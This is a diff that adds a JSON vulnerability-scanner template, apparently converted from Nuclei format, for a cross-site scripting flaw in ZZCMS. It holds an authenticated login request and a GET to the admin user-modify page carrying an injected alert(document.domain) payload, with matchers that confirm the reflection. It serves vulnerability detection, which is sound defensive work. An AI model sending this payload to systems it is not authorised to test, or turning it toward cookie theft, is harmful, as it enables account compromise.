@@ -1,0 +1,127 @@
+{
+  "id": "zzcms-xss",
+  "name": "ZZCMS - Cross-Site Scripting",
+  "author": "ritikchaddha",
+  "severity": "HIGH",
+  "description": "ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.",
+  "references": [
+    "https://github.com/JcQSteven/blog/issues/20"
+  ],
+  "tags": [
+    "zzcms",
+    "xss",
+    "authenticated"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "7.2",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /admin/logincheck.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nadmin\u003d{{username}}\u0026pass\u003d{{password}}\n",
+        "GET /admin/usermodify.php?id\u003d1%22%2balert(document.domain)%2b%22 HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(header_2, \u0027text/html\u0027)",
+            "status_code_2 \u003d\u003d 200",
+            "contains(body_2, \"参数 1\\\"+alert(document.domain)+\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "zzcms-xss",
+    "info": {
+      "name": "ZZCMS - Cross-Site Scripting",
+      "author": "ritikchaddha",
+      "severity": "high",
+      "description": "ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.",
+      "reference": [
+        "https://github.com/JcQSteven/blog/issues/20"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "cvss_score": "7.2",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "zzcms,xss,authenticated"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /admin/logincheck.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nadmin\u003d{{username}}\u0026pass\u003d{{password}}\n",
+          "GET /admin/usermodify.php?id\u003d1%22%2balert(document.domain)%2b%22 HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(header_2, \u0027text/html\u0027)",
+              "status_code_2 \u003d\u003d 200",
+              "contains(body_2, \"参数 1\\\"+alert(document.domain)+\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
